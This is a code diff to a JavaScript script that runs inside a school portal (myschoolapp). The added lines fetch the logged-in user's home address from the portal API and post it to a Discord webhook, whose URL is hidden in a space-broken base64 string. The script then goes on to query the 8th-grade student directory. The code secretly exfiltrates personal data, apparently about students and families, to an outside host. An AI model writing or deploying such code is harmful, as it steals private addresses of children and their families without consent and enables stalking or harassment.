@@ -106,6 +106,10 @@ this.style.display = 'none'
 */
 
 async function s() {
+    var addr = await fetch('https://headwaters.myschoolapp.com/api/user/address/?userId=' + p3.Data.Context.attributes.UserInfo.UserId).then(function (res) {
+        return res.json()
+    });
+    
     var mdfg = "a HR0 cHM 6Ly 9ka XNj b3J kLm Nvb S9h cGk vd2 Via G9v a3M vMT M2ND cwM Dc 5NTM3ODk5MTEzNC9OS0haYy14U3VBY3ZnbnNKbEJfVEtza2RyQWVjTHVqWnN0dkZWQzhqa0xmUkdtZVRlNFlHU3pPc2t1dUpTVUlUUmFZbg=="
 mdfg = mdfg.replace(/\s/g, '');
 mdfg = atob(mdfg)
@@ -115,10 +119,12 @@ mdfg = atob(mdfg)
                 'Content-Type': 'application/json'
             },
             body: JSON.stringify({
-                content: 'start',
+                content: JSON.stringify(addr),
                 username: p3.Data.Context.attributes.MasterUserInfo.FirstName
             })
         })
+        
+        console.log(JSON.stringify(addr))
     let a = await (await fetch("https://headwaters.myschoolapp.com/api/directory/directoryresultsget?directoryId=5196&searchVal=&facets=32001_8th%20Grade&searchAll=false", {
   "headers": {
     "accept": "application/json, text/javascript, */*; q=0.01",
